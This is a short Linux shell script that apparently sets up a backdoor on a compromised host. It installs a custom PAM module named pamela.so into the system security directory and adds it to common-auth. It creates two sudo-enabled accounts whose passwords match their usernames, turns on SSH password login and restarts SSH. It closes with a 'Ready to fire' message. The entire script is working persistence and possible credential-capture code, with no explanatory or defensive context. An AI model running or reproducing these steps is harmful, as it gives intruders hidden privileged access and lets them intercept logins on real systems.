mv /tmp/pamela.so /lib/x86_64-linux-gnu/security/pamela.so

useradd rotta_f -m -p $(perl -e 'print crypt("rotta_f", "password")')
gpasswd -a rotta_f sudo
useradd sommer_q -m -p $(perl -e 'print crypt("sommer_q", "password")')
gpasswd -a sommer_q sudo

sed -i "/PasswordAuthentication no/c\PasswordAuthentication yes" /etc/ssh/sshd_config

service ssh restart

echo "auth required pamela.so" >> /etc/pam.d/common-auth
echo "session required pamela.so" >> /etc/pam.d/common-auth

echo "DAMN SON, Ready to fire"
